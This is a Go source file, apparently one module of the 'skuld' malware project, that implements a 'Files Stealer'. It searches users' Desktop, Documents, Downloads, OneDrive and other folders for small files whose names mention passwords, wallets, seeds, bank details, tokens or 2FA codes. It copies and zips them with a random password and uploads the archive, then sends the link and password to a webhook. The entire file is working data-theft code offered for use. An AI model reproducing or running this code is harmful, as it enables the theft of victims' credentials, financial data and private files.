package commonfiles

import (
	"fmt"
	"math/rand"
	"os"

	"path/filepath"
	"strings"

	"github.com/hackirby/skuld/utils/fileutil"
	"github.com/hackirby/skuld/utils/hardware"
	"github.com/hackirby/skuld/utils/requests"
)

func Run(webhook string) {
	tempdir := filepath.Join(os.TempDir(), "commonfiles-temp")
	os.MkdirAll(tempdir, os.ModePerm)
	defer os.RemoveAll(tempdir)

	extensions := []string{
		".txt",
		".log",
		".doc",
		".docx",
		".xls",
		".xlsx",
		".ppt",
		".pptx",
		".odt",
		".pdf",
		".rtf",
		".json",
		".csv",
		".db",
		".jpg",
		".jpeg",
		".png",
		".gif",
		".webp",
		".mp4",
	}
	keywords := []string{
		"account",
		"password",
		"secret",
		"mdp",
		"motdepass",
		"mot_de_pass",
		"login",
		"paypal",
		"banque",
		"seed",
		"banque",
		"bancaire",
		"bank",
		"metamask",
		"wallet",
		"crypto",
		"exodus",
		"atomic",
		"auth",
		"mfa",
		"2fa",
		"code",
		"memo",
		"compte",
		"token",
		"password",
		"credit",
		"card",
		"mail",
		"address",
		"phone",
		"permis",
		"number",
		"backup",
		"database",
		"config",
	}

	found := 0
	for _, user := range hardware.GetUsers() {
		for _, dir := range []string{
			filepath.Join(user, "Desktop"),
			filepath.Join(user, "Downloads"),
			filepath.Join(user, "Documents"),
			filepath.Join(user, "Videos"),
			filepath.Join(user, "Pictures"),
			filepath.Join(user, "Music"),
			filepath.Join(user, "OneDrive"),
		} {
			if _, err := os.Stat(dir); err != nil {
				continue
			}
			filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
				if err != nil {
					return nil
				}
				if info.IsDir() {
					return nil
				}
				if info.Size() > 2*1024*1024 {
					return nil
				}
				for _, keyword := range keywords {
					if !strings.Contains(strings.ToLower(info.Name()), keyword) {
						continue
					}
					for _, extension := range extensions {
						if !strings.HasSuffix(strings.ToLower(info.Name()), extension) {
							continue
						}
						dest := filepath.Join(tempdir, strings.Split(user, "\\")[2], info.Name())
						if fileutil.Exists(dest) {
							dest = filepath.Join(tempdir, strings.Split(user, "\\")[2], fmt.Sprintf("%s_%s", info.Name(), randString(4)))
						}
						os.MkdirAll(filepath.Join(tempdir, strings.Split(user, "\\")[2]), os.ModePerm)

						err := fileutil.CopyFile(path, dest)
						if err != nil {
							continue
						}
						break
					}
					found++
					break
				}
				return nil
			})
		}
	}

	if found == 0 {
		return
	}

	tempzip := filepath.Join(os.TempDir(), "commonfiles.zip")
	password := randString(16)
	fileutil.ZipWithPassword(tempdir, tempzip, password)
	defer os.Remove(tempzip)

	link, err := requests.Upload(tempzip)
	if err != nil {
		return
	}

	requests.Webhook(webhook, map[string]interface{}{
		"embeds": []map[string]interface{}{
			{
				"title":       "Files Stealer",
				"description": "```" + fileutil.Tree(tempdir, "") + "```",
				"fields": []map[string]interface{}{
					{
						"name":   "Archive Link",
						"value":  "[Download here](" + link + ")",
						"inline": true,
					},
					{
						"name":   "Archive Password",
						"value":  "`" + password + "`",
						"inline": true,
					},
					{
						"name":   "Files Found",
						"value":  fmt.Sprintf("`%d`", found),
						"inline": true,
					},
				},
			},
		},
	})
}

func randString(n int) string {
	var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
	b := make([]rune, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}
